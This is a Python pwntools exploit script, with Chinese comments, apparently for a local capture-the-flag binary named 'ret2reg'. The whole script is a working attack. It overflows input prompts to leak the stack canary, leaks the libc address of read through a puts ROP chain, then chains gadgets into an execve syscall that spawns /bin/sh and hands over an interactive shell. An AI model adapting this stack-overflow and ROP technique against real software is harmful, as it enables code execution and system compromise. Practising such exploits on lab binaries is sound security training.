from pwn import *

# 加载 ELF 文件并启动进程
binary = './ret2reg'
elf = ELF(binary)
io = process(binary)

# 第一阶段：泄漏 Canary 值
def leak_canary():
    io.recvuntil(b'Who are you?\n')
    padding = b'A' * (0x50 - 0x8)
    io.sendline(padding)
    io.recvuntil(padding)
    canary = u64(io.recv(8)) - 0xa
    log.info(f"Canary: {hex(canary)}")
    return canary

# 第二阶段：泄漏 read 函数地址
def leak_read_address(canary):
    io.recvuntil(b'tell me your real name?\n')
    payload = b'A' * (0x50 - 0x8)
    payload += p64(canary)
    payload += b'B' * 8  # 对齐填充
    payload += p64(0x4007f3)  # pop rdi; ret
    payload += p64(elf.got['read'])  # 参数传入 puts
    payload += p64(elf.plt['puts'])  # 调用 puts 输出地址
    payload += p64(0x4006C6)  # 返回到主循环
    io.send(payload)

    io.recvuntil(b'See you again!\n')
    read_addr = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
    log.info(f"Read address: {hex(read_addr)}")
    return read_addr

# 第三阶段：利用泄漏的地址构造 ROP，触发 Shell
def trigger_shell(canary, read_addr):
    syscall_addr = read_addr + 0xe
    log.info(f"Syscall address: {hex(syscall_addr)}")

    # 构造第一部分 payload
    io.recvuntil(b'Who are you?\n')
    io.sendline(b'A' * (0x50 - 0x8))

    io.recvuntil(b'tell me your real name?\n')
    rop_chain = b'A' * (0x50 - 0x8)
    rop_chain += p64(canary)
    rop_chain += b'C' * 8  # 对齐填充
    rop_chain += p64(0x4007EA)  # pop rdx; pop rsi; pop rdi; ret
    rop_chain += p64(0) + p64(1) + p64(elf.got['read']) + p64(0x3B) + p64(0x601060) + p64(0)
    rop_chain += p64(0x4007D0)  # 调用 syscall
    rop_chain += p64(0)
    rop_chain += p64(0) + p64(1) + p64(0x601068) + p64(0) + p64(0) + p64(0x601060)
    rop_chain += p64(0x4007D0)  # 再次调用 syscall

    io.send(rop_chain)

    # 构造 /bin/sh 内容
    sleep(0.5)
    content = b'/bin/sh\x00' + p64(syscall_addr)
    content = content.ljust(0x3B, b'A')  # 填充到预期长度
    io.send(content)

# 交互式 Shell
def main():
    canary = leak_canary()
    read_addr = leak_read_address(canary)
    trigger_shell(canary, read_addr)
    io.interactive()

if __name__ == '__main__':
    main()
